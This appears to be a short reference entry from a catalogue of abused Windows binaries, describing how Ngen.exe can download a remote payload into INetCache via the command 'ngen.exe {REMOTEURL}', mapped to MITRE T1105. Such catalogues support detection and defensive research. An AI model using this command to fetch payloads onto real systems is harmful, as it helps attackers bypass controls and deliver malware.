title: Ngen.exe
html:
Ngen.exe

Microsoft Native Image Generator.

Download

It will download a remote payload and place it in INetCache.

ngen.exe {REMOTEURL}

Downloads payload from remote server using the Microsoft Native Image Generator utility. — MITRE: T1105 — Privileges: User
